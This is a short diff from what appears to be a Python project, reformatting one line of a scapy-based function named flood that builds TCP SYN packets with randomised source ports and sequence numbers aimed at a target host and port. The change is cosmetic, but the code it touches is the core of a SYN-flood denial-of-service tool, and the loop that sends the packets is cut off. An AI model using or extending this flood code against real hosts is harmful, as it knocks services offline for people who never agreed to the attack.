@@ -5,7 +5,11 @@ from scapy.all import IP, TCP, RandShort, send
 
 def flood(target):
     packet = IP(dst=target[0]) / TCP(
-        dport=target[1], flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort(),
+        dport=target[1],
+        flags="S",
+        seq=RandShort(),
+        ack=RandShort(),
+        sport=RandShort(),
     )
 
     for i in range(4):
